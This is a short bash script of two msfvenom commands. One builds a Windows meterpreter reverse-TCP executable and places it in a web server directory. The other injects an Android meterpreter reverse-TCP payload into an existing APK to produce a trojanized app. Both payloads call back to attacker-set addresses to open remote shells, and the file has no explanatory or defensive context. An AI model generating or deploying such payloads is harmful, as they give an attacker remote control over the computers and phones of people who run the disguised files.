#!/bin/bash

# windows 
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.122.65 -b "\x00" -f exe -o /var/www/html/windows-192-168-122-165.exe

# android injection
msfvenom -p android/meterpreter/reverse_tcp -x source.apk LHOST=172.20.10.2 LPORT=4444 -f raw -o output.apk
